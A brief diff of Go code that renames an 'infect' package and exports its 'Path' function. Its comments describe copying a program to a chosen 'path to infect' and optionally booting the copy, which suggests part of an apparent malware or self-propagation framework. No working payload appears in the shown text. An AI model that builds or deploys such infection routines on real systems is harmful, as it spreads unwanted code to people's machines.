@@ -1,4 +1,4 @@
-package infect
+package path
 
 import (
 	"fmt"
@@ -13,7 +13,7 @@ import (
 // Requires an evil array with the following format
 // 1 - Path to infect, MUST end with the name that the copy will have
 // 2 - Should the copy be booted once the process is done? (true/false)
-func path(value string, s_json string) ([]string, string) {
+func Path(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "infect_path"
 	arr := structure.Create_evil_object(value)
